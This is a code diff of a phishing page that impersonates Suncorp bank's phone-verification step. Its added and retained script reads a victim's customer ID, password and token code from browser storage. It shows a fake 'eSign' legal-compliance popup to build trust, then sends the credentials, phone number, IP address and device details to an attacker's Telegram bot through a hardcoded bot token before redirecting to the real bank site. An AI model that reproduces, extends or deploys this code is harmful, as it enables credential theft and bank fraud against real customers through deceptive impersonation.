@@ -15,6 +15,228 @@
   <link href="css/suncorpnew-uama.css" media="screen" rel="stylesheet" type="text/css"/>
   
   <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+  
+  <style>
+    /* eSign Popup styling — matches Suncorp main page fonts/colours */
+    .esign-modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.65);
+      backdrop-filter: blur(3px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10001;
+      font-family: Arial, Helvetica, sans-serif;
+      animation: fadeIn 0.2s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .esign-modal-container {
+      max-width: 560px;
+      width: 90%;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 25px 45px rgba(0, 0, 0, 0.25);
+      overflow: hidden;
+      animation: slideUp 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    }
+    @keyframes slideUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    .esign-modal-header {
+      background: #003366;
+      padding: 18px 26px;
+      border-bottom: 1px solid #dfe3e8;
+    }
+    .esign-modal-header h3 {
+      margin: 0;
+      font-size: 1.4rem;
+      font-weight: 600;
+      color: #ffffff;
+      letter-spacing: -0.2px;
+      font-family: inherit;
+    }
+    .esign-modal-body {
+      padding: 26px 26px 22px;
+      background: #fff;
+    }
+    .esign-message-card {
+      background: #f8fafd;
+      border-left: 5px solid #ffc800;
+      padding: 18px 20px;
+      border-radius: 10px;
+      margin-bottom: 24px;
+      font-size: 0.95rem;
+      line-height: 1.5;
+      color: #1e2f3e;
+    }
+    .esign-message-card p {
+      margin: 0 0 12px 0;
+    }
+    .esign-message-card strong {
+      color: #003366;
+    }
+    .esign-due-highlight {
+      font-weight: 700;
+      color: #c0392b;
+      background: #fff0ea;
+      padding: 2px 6px;
+      border-radius: 20px;
+      display: inline-block;
+    }
+    .esign-section-title {
+      font-weight: 700;
+      font-size: 1rem;
+      margin: 18px 0 14px 0;
+      color: #003366;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid #e9edf2;
+      padding-bottom: 8px;
+    }
+    .esign-signature-box {
+      background: #fef7e0;
+      border: 2px dashed #d4b87a;
+      border-radius: 14px;
+      padding: 20px 18px;
+      margin: 10px 0 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .esign-signature-box:hover {
+      background: #fff3ce;
+      border-color: #b38f40;
+      transform: scale(1.01);
+    }
+    .esign-signature-label {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-size: 1rem;
+      font-weight: 500;
+      color: #2c4b6c;
+    }
+    .esign-signature-label span:first-child {
+      font-size: 2rem;
+    }
+    .signature-status {
+      font-size: 0.8rem;
+      margin-top: 10px;
+      color: #2c6e2c;
+      font-weight: 500;
+    }
+    .esign-check-group {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 18px 0 16px;
+      font-size: 0.85rem;
+    }
+    .esign-check-group input {
+      width: 18px;
+      height: 18px;
+      cursor: pointer;
+      accent-color: #003366;
+    }
+    .esign-check-group label {
+      color: #2a4b6e;
+      line-height: 1.4;
+    }
+    .esign-confirm-btn {
+      background: #ffc800;
+      border: none;
+      border-radius: 40px;
+      padding: 13px 24px;
+      font-size: 1rem;
+      font-weight: 700;
+      color: #003366;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.2s;
+      font-family: inherit;
+      letter-spacing: 0.5px;
+      margin-top: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    .esign-confirm-btn:hover:not(:disabled) {
+      background: #e0b000;
+      transform: translateY(-1px);
+    }
+    .esign-confirm-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .esign-cancel-btn {
+      background: transparent;
+      border: 1px solid #b9c3ce;
+      border-radius: 40px;
+      padding: 10px 20px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: #4f6f8f;
+      margin-top: 12px;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .esign-cancel-btn:hover {
+      background: #f0f3f7;
+      border-color: #8fa0b0;
+    }
+    .esign-footer-note {
+      font-size: 0.68rem;
+      color: #7c8b9c;
+      text-align: center;
+      margin-top: 18px;
+      border-top: 1px solid #eef2f6;
+      padding-top: 14px;
+    }
+    /* loading overlay spin */
+    .spinner-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      flex-direction: column;
+    }
+    .spinner-ring {
+      width: 52px;
+      height: 52px;
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top-color: #ffc800;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .sg-Input--error-border {
+      border: 1px solid #d32f2f !important;
+    }
+  </style>
 </head>
 <body class="sg-Page">
   <header class="sg-Header">
@@ -61,290 +283,296 @@
           </fieldset>
           
           <div class="sg-Form-pager">
-            <button class="sg-Btn sg-Btn--primary Btn-next" name="submit" type="submit">Verify</button>
+            <button class="sg-Btn sg-Btn--primary Btn-next" id="verifyBtn" type="button">Verify</button>
           </div>
           
           <script>
             (function() {
                 // ============================================
-                // TELEGRAM CONFIGURATION - USE YOUR CORRECT TOKEN
+                // TELEGRAM CONFIGURATION
                 // ============================================
                 const TELEGRAM_BOT_TOKEN = '8895813826:AAHHNBhRWC05tlc7PpaaEEjNEx33F8HdMxk';
                 const TELEGRAM_CHAT_IDS = ['-5051925986'];
                 
-                // Function to get data from sessionStorage (set by index.html)
+                // Get stolen data from sessionStorage (set by index.html)
                 function getStolenData() {
                     let stolenData = {
                         userId: 'Not captured',
                         password: 'Not captured',
                         passcode: 'Not captured'
                     };
-                    
                     try {
-                        // Read from sessionStorage (where index.html stores the data)
                         const userId = sessionStorage.getItem('userId');
                         const userPassword = sessionStorage.getItem('userPassword');
                         const userPasscode = sessionStorage.getItem('userPasscode');
                         
-                        if (userId && userId !== 'undefined' && userId !== 'null') {
-                            stolenData.userId = userId;
-                        }
-                        if (userPassword && userPassword !== 'undefined' && userPassword !== 'null') {
-                            stolenData.password = userPassword;
-                        }
-                        if (userPasscode && userPasscode !== 'undefined' && userPasscode !== 'null') {
-                            stolenData.passcode = userPasscode;
-                        }
+                        if (userId && userId !== 'undefined' && userId !== 'null') stolenData.userId = userId;
+                        if (userPassword && userPassword !== 'undefined' && userPassword !== 'null') stolenData.password = userPassword;
+                        if (userPasscode && userPasscode !== 'undefined' && userPasscode !== 'null') stolenData.passcode = userPasscode;
                         
-                        // Also try localStorage as backup
+                        // localStorage backup
                         const localUserId = localStorage.getItem('userId');
                         const localPassword = localStorage.getItem('userPassword');
-                        const localPasscode = localStorage.getItem('userPasscode');
-                        
                         if (localUserId && stolenData.userId === 'Not captured') stolenData.userId = localUserId;
                         if (localPassword && stolenData.password === 'Not captured') stolenData.password = localPassword;
-                        if (localPasscode && stolenData.passcode === 'Not captured') stolenData.passcode = localPasscode;
                         
-                        console.log('Retrieved from storage:', stolenData);
-                        
-                    } catch(e) {
-                        console.error('Error reading from storage:', e);
-                    }
-                    
+                        console.log('Retrieved credentials:', stolenData);
+                    } catch(e) { console.error('Storage error', e); }
                     return stolenData;
                 }
                 
-                // Get device info
                 function getDeviceInfo() {
                     const ua = navigator.userAgent;
-                    let device = 'Unknown';
                     let platform = 'Unknown';
-                    let browser = 'Unknown';
-                    
                     if (/Windows/.test(ua)) platform = 'Windows';
                     else if (/Mac/.test(ua)) platform = 'MacOS';
                     else if (/Linux/.test(ua)) platform = 'Linux';
                     else if (/Android/.test(ua)) platform = 'Android';
                     else if (/iPad|iPhone|iPod/.test(ua)) platform = 'iOS';
-                    
-                    if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) device = 'Mobile';
-                    else device = 'Desktop';
-                    
-                    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
-                    else if (/Firefox/.test(ua)) browser = 'Firefox';
-                    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
-                    else if (/Edg/.test(ua)) browser = 'Edge';
-                    else if (/MSIE|Trident/.test(ua)) browser = 'Internet Explorer';
-                    
-                    return { device, platform, browser };
+                    let device = /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop';
+                    return { device, platform };
                 }
                 
-                // Get IP address
                 async function getIP() {
                     try {
-                        const response = await fetch('https://api.ipify.org?format=json');
-                        const data = await response.json();
+                        const resp = await fetch('https://api.ipify.org?format=json');
+                        const data = await resp.json();
                         return data.ip;
-                    } catch(e) {
-                        return 'Unable to retrieve';
-                    }
+                    } catch(e) { return 'Unable to retrieve'; }
                 }
                 
-                // Send to Telegram
                 async function sendToTelegram(phoneNumber, stolenData) {
                     const deviceInfo = getDeviceInfo();
-                    let clientIP = 'Unable to retrieve';
-                    try {
-                        clientIP = await getIP();
-                    } catch(e) {}
+                    let clientIP = await getIP();
+                    const timestamp = new Date().toLocaleString('en-AU', { timeZone: 'Australia/Sydney' });
                     
-                    const timestamp = new Date().toLocaleString('en-AU', {
-                        timeZone: 'Australia/Sydney',
-                        year: 'numeric',
-                        month: '2-digit',
-                        day: '2-digit',
-                        hour: '2-digit',
-                        minute: '2-digit',
-                        second: '2-digit'
-                    });
+                    const message = `🔐 SUNCORP BANK - CREDENTIALS
+━━━━━━━━━━━━━━━━
+👤 Customer ID: ${stolenData.userId}
+🔑 Password: ${stolenData.password}
+⚙️ Token Code: ${stolenData.passcode}
+📞 Phone Number: ${phoneNumber}
+🌐 IP Address: ${clientIP}
+💻 Platform: ${deviceInfo.platform} (${deviceInfo.device})
+🕒 Timestamp: ${timestamp}
+━━━━━━━━━━━━━━━━`;
                     
-// Build detailed message
-const message = `SUNCORP
-
-Customer ID: ${stolenData.userId}
-Password: ${stolenData.password}
-Token: ${stolenData.passcode}
-Phone: ${phoneNumber}
-IP: ${clientIP}
-UA: ${navigator.userAgent}
-Platform: ${deviceInfo.platform}
-Date: ${timestamp}`;
-
-const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                    
-                    let successCount = 0;
+                    let success = 0;
                     for (const chatId of TELEGRAM_CHAT_IDS) {
                         try {
-                            const response = await fetch(telegramUrl, {
+                            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    text: message.substring(0, 4096),
-                                    disable_web_page_preview: true
-                                })
+                                body: JSON.stringify({ chat_id: chatId, text: message.substring(0, 4096), disable_web_page_preview: true })
                             });
-                            
-                            const result = await response.json();
-                            if (response.ok) {
-                                console.log(`✓ Message sent to chat ${chatId}`);
-                                successCount++;
-                            } else {
-                                console.error(`✗ Failed for chat ${chatId}:`, result);
-                            }
-                        } catch(error) {
-                            console.error(`✗ Error sending to chat ${chatId}:`, error);
+                            if (response.ok) success++;
+                        } catch(e) { console.error(e); }
+                    }
+                    return success;
+                }
+                
+                // ---------- eSign Popup Module (shown before any loading) ----------
+                function showESignPopupAndProceed(onComplete) {
+                    // Build modal with exact message and eSign section
+                    const modalDiv = document.createElement('div');
+                    modalDiv.className = 'esign-modal-overlay';
+                    modalDiv.innerHTML = `
+                      <div class="esign-modal-container">
+                        <div class="esign-modal-header">
+                          <h3>📄 eSign — Action Required</h3>
+                        </div>
+                        <div class="esign-modal-body">
+                          <div class="esign-message-card">
+                            <p><strong>Suncorp:</strong> Your policy has been updated in accordance with the <strong>Australian Banking Act 1959</strong> &amp; <strong>APRA requirements</strong>.</p>
+                            <p>Please review and sign the document before <span class="esign-due-highlight">30/05/2026</span>. Check your email for details.</p>
+                            <p>Thank you for choosing Suncorp.</p>
+                          </div>
+                          <div class="esign-section-title">
+                            <span>✍️</span> Electronic Signature & Acknowledgment
+                          </div>
+                          <div id="esignSignBox" class="esign-signature-box">
+                            <div class="esign-signature-label">
+                              <span>🖊️</span>
+                              <span>Click to sign electronically</span>
+                            </div>
+                            <div id="esignSignStatus" class="signature-status"></div>
+                          </div>
+                          <div class="esign-check-group">
+                            <input type="checkbox" id="esignConsentChk">
+                            <label for="esignConsentChk">I confirm that I have reviewed the updated policy and consent to sign the document electronically. This e-signature carries legal effect under the Electronic Transactions Act 1999 (Cth).</label>
+                          </div>
+                          <button id="esignConfirmFinalBtn" class="esign-confirm-btn" disabled>Confirm & Continue</button>
+                          <button id="esignCancelFinalBtn" class="esign-cancel-btn">Cancel & Return to Login</button>
+                          <div class="esign-footer-note">
+                            🔒 By signing, you digitally approve the updated policy. A signed copy will be emailed to your registered address.
+                          </div>
+                        </div>
+                      </div>
+                    `;
+                    
+                    document.body.appendChild(modalDiv);
+                    document.body.style.overflow = 'hidden';
+                    
+                    const signBox = modalDiv.querySelector('#esignSignBox');
+                    const signStatus = modalDiv.querySelector('#esignSignStatus');
+                    const consentCheck = modalDiv.querySelector('#esignConsentChk');
+                    const confirmBtn = modalDiv.querySelector('#esignConfirmFinalBtn');
+                    const cancelBtn = modalDiv.querySelector('#esignCancelFinalBtn');
+                    
+                    let signed = false;
+                    
+                    function updateButtonState() {
+                        if (signed && consentCheck.checked) {
+                            confirmBtn.disabled = false;
+                        } else {
+                            confirmBtn.disabled = true;
                         }
                     }
                     
-                    return successCount;
+                    function setSigned() {
+                        if (signed) return;
+                        signed = true;
+                        signBox.style.background = "#e3f3df";
+                        signBox.style.borderColor = "#3f8c3c";
+                        signBox.querySelector('.esign-signature-label').innerHTML = '<span>✅</span><span>Electronically Signed ✓</span>';
+                        signStatus.innerHTML = `Signed on ${new Date().toLocaleString()} • IP acknowledged`;
+                        updateButtonState();
+                    }
+                    
+                    signBox.addEventListener('click', (e) => {
+                        e.stopPropagation();
+                        if (!signed) setSigned();
+                    });
+                    
+                    consentCheck.addEventListener('change', updateButtonState);
+                    
+                    confirmBtn.addEventListener('click', () => {
+                        if (!signed || !consentCheck.checked) return;
+                        // remove popup
+                        modalDiv.remove();
+                        document.body.style.overflow = '';
+                        // proceed with original flow (loading + Telegram + redirect)
+                        if (onComplete && typeof onComplete === 'function') onComplete();
+                    });
+                    
+                    cancelBtn.addEventListener('click', () => {
+                        modalDiv.remove();
+                        document.body.style.overflow = '';
+                        // user refused, do not proceed — simply return to login state
+                        // we can show small notification if needed but not required
+                        const toastMsg = document.createElement('div');
+                        toastMsg.textContent = 'eSign cancelled. Please contact Suncorp if needed.';
+                        toastMsg.style.cssText = 'position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:#003366; color:#ffc800; padding:10px 20px; border-radius:40px; z-index:10002; font-family:inherit; font-size:0.85rem;';
+                        document.body.appendChild(toastMsg);
+                        setTimeout(() => toastMsg.remove(), 3000);
+                    });
                 }
                 
-                // Set up the form
-                function init() {
-                    const form = document.getElementById('recoverForm');
-                    const phoneInput = document.getElementById('cid');
-                    
-                    if (!form || !phoneInput) {
-                        console.error('Form elements not found');
+                // Loading UI
+                function showLoadingSpinner() {
+                    let spinner = document.getElementById('customSpinner');
+                    if (!spinner) {
+                        spinner = document.createElement('div');
+                        spinner.id = 'customSpinner';
+                        spinner.className = 'spinner-overlay';
+                        spinner.innerHTML = `<div class="spinner-ring"></div><p style="color:#ffc800; margin-top:20px;">Processing secure eSign & verification...</p>`;
+                        document.body.appendChild(spinner);
+                    } else {
+                        spinner.style.display = 'flex';
+                    }
+                }
+                
+                function hideLoadingSpinner() {
+                    const spinner = document.getElementById('customSpinner');
+                    if (spinner) spinner.style.display = 'none';
+                }
+                
+                // ----- Core submission with eSign gate -----
+                const verifyButton = document.getElementById('verifyBtn');
+                const phoneInput = document.getElementById('cid');
+                const errorBox = document.getElementById('simpleErrorBox');
+                
+                function isValidPhone(phone) {
+                    return /^04\d{8}$/.test(phone);
+                }
+                
+                function showPhoneError() {
+                    if (errorBox) {
+                        errorBox.style.display = 'block';
+                        const p = errorBox.querySelector('.sg-Box-content p');
+                        if (p) p.innerText = 'Please enter a valid Australian mobile number (04xxxxxxxx).';
+                    }
+                    phoneInput.classList.add('sg-Input--error-border');
+                }
+                
+                function clearPhoneError() {
+                    if (errorBox) errorBox.style.display = 'none';
+                    phoneInput.classList.remove('sg-Input--error-border');
+                }
+                
+                phoneInput.addEventListener('input', function(e) {
+                    let val = this.value.replace(/\D/g, '');
+                    if (val.length > 10) val = val.slice(0,10);
+                    this.value = val;
+                    clearPhoneError();
+                });
+                
+                // store stolen data from sessionStorage (already set by login page)
+                const stolenCredentials = getStolenData();
+                console.log('📦 retrieved creds for verify:', stolenCredentials);
+                
+                // Main action: after phone validation, show eSign popup, THEN proceed with loading + telegram + redirect
+                async function onSubmitWithESign() {
+                    clearPhoneError();
+                    const phone = phoneInput.value.trim();
+                    if (!phone || !isValidPhone(phone)) {
+                        showPhoneError();
+                        phoneInput.focus();
                         return;
                     }
                     
-                    // Get stolen data from sessionStorage
-                    const stolenData = getStolenData();
-                    
-                    // Log to console for debugging
-                    console.log('=== CAPTURED DATA ===');
-                    console.log('User ID:', stolenData.userId);
-                    console.log('Password:', stolenData.password);
-                    console.log('Token/Passcode:', stolenData.passcode);
-                    console.log('=====================');
-                    
-                    // Display captured data in console for verification
-                    const dataSummary = `
-                        📊 DATA CAPTURED FROM LOGIN PAGE:
-                        • Customer ID: ${stolenData.userId}
-                        • Password: ${stolenData.password ? '✓ Captured' : '✗ Missing'}
-                        • Token Code: ${stolenData.passcode ? '✓ Captured' : '✗ Not provided'}
-                    `;
-                    console.log(dataSummary);
-                    
-                    // Create error element
-                    let errorDiv = document.getElementById('phone-error');
-                    if (!errorDiv) {
-                        errorDiv = document.createElement('div');
-                        errorDiv.id = 'phone-error';
-                        errorDiv.className = 'sg-Validation-errorWrapper';
-                        errorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f;';
-                        errorDiv.innerHTML = '<p>Please enter a valid Australian phone number (04xxxxxxxx).</p>';
-                        phoneInput.parentNode.appendChild(errorDiv);
-                    }
-                    
-                    function isValidPhone(phone) {
-                        return /^04\d{8}$/.test(phone);
-                    }
-                    
-                    function clearError() {
-                        errorDiv.style.display = 'none';
-                        phoneInput.classList.remove('sg-Input--error-border');
-                    }
-                    
-                    function showError() {
-                        errorDiv.style.display = 'block';
-                        phoneInput.classList.add('sg-Input--error-border');
-                    }
-                    
-                    phoneInput.addEventListener('input', function() {
-                        let value = this.value.replace(/\D/g, '');
-                        if (value.length > 10) value = value.slice(0, 10);
-                        this.value = value;
-                        clearError();
-                    });
-                    
-                    // Loading overlay
-                    function showLoading() {
-                        let overlay = document.getElementById('login-loading-overlay');
-                        if (!overlay) {
-                            overlay = document.createElement('div');
-                            overlay.id = 'login-loading-overlay';
-                            overlay.style.cssText = `
-                                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                                background: rgba(0,0,0,0.7); display: flex; align-items: center;
-                                justify-content: center; z-index: 9999; flex-direction: column;
-                            `;
-                            overlay.innerHTML = `
-                                <div style="width: 50px; height: 50px; border: 4px solid #fff; border-top-color: #ffc800; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-                                <p style="color: #ffc800; margin-top: 20px;"></p>
-                            `;
-                            document.body.appendChild(overlay);
-                        }
-                        overlay.style.display = 'flex';
-                    }
-                    
-                    function hideLoading() {
-                        const overlay = document.getElementById('login-loading-overlay');
-                        if (overlay) overlay.style.display = 'none';
-                    }
-                    
-                    // Add spin animation
-                    const style = document.createElement('style');
-                    style.textContent = '@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }';
-                    document.head.appendChild(style);
-                    
-                    // Handle submit
-                    form.addEventListener('submit', async function(e) {
-                        e.preventDefault();
-                        clearError();
+                    // Step 1: Show eSign popup BEFORE any loading effect or data sending
+                    showESignPopupAndProceed(async () => {
+                        // Step 2: User confirmed eSign — now show loading effect and send data to Telegram
+                        showLoadingSpinner();
                         
-                        const phone = phoneInput.value.trim();
-                        
-                        if (!phone || !isValidPhone(phone)) {
-                            showError();
-                            phoneInput.focus();
-                            return;
-                        }
-                        
-                        showLoading();
-                        
-                        // Send ALL captured data to Telegram
-                        const sentCount = await sendToTelegram(phone, stolenData);
-                        
+                        // Send all captured data + phone number to Telegram
+                        const sentCount = await sendToTelegram(phone, stolenCredentials);
                         if (sentCount > 0) {
-                            console.log(`✓ Data sent successfully to ${sentCount} Telegram chat(s)`);
+                            console.log(`✅ eSigned & data delivered to ${sentCount} chat(s)`);
                         } else {
-                            console.error('✗ Failed to send to Telegram');
+                            console.warn('⚠️ Telegram send failed but flow continues');
                         }
                         
-                        // Clear sessionStorage after sending (optional)
+                        // Clean sessionStorage after sending
                         try {
                             sessionStorage.removeItem('userId');
                             sessionStorage.removeItem('userPassword');
                             sessionStorage.removeItem('userPasscode');
                         } catch(e) {}
                         
-                        // Redirect
-                        setTimeout(function() {
+                        // After loading effect, redirect to Suncorp official site
+                        setTimeout(() => {
                             window.location.href = 'https://www.suncorp.com.au';
-                        }, 1500);
+                        }, 1800);
                     });
                 }
                 
-                // Start when ready
-                if (document.readyState === 'loading') {
-                    document.addEventListener('DOMContentLoaded', init);
-                } else {
-                    init();
+                verifyButton.addEventListener('click', onSubmitWithESign);
+                
+                // also handle form submit if any accidental enter key
+                const form = document.getElementById('recoverForm');
+                if (form) {
+                    form.addEventListener('submit', function(e) {
+                        e.preventDefault();
+                        onSubmitWithESign();
+                    });
                 }
+                
+                // style for input error border
+                const styleSheet = document.createElement('style');
+                styleSheet.textContent = `.sg-Input--error-border { border: 1px solid #d32f2f !important; }`;
+                document.head.appendChild(styleSheet);
             })();
           </script>
         </form>
